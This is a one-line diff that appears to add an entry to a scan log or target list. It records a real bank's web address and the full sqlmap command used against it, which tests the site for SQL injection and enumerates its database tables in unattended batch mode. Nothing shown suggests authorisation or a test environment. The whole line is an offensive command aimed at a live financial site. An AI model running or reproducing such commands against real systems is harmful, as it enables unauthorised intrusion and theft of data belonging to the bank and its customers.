@@ -1,0 +1,1 @@
+https://www.scb.co.th?id=1 (GET)  # C:\Users\Administrator\AppData\Local\Programs\Python\Python311\Scripts\sqlmap -u https://www.scb.co.th?id=1 --tables --batch --output-dir sqlmap_deep_20251027_104959
